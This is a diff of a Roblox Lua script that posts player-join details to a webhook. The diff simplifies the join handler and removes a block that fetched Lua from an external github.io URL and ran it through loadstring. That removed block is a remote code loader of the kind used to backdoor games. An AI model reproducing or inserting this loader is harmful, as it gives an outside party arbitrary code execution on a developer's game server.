@@ -15,9 +15,8 @@ local function sendEmbed(title, description, fields)
 
     local jsonData = HttpService:JSONEncode(data)
 
-    local response
     local success, errorMessage = pcall(function()
-        response = HttpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson)
+        HttpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson)
     end)
 
     if success then
@@ -37,28 +36,7 @@ local function getPlayerInfo(player)
     }
 end
 
-local function onPlayerAdded(player)
-    -- Debounce to ensure the function runs only once per player join
-    if not player:GetAttribute("HasJoined") then
-        player:SetAttribute("HasJoined", true)
-        local embedFields = getPlayerInfo(player)
-        sendEmbed("Player Joined", player.Name .. " has joined the game.", embedFields)
-    end
-end
-
-game.Players.PlayerAdded:Connect(onPlayerAdded)
-
-local success, response = pcall(function()
-    return HttpService:GetAsync("https://pgertools.github.io/Repurcution/main.lua")
+game.Players.PlayerAdded:Connect(function(player)
+    local embedFields = getPlayerInfo(player)
+    sendEmbed("Player Joined", player.Name .. " has joined the game.", embedFields)
 end)
-
-if success then
-    local loadSuccess, loadError = pcall(function()
-        loadstring(response)()
-    end)
-    if not loadSuccess then
-        warn("Error loading script: " .. loadError)
-    end
-else
-    warn("Error fetching script: " .. response)
-end
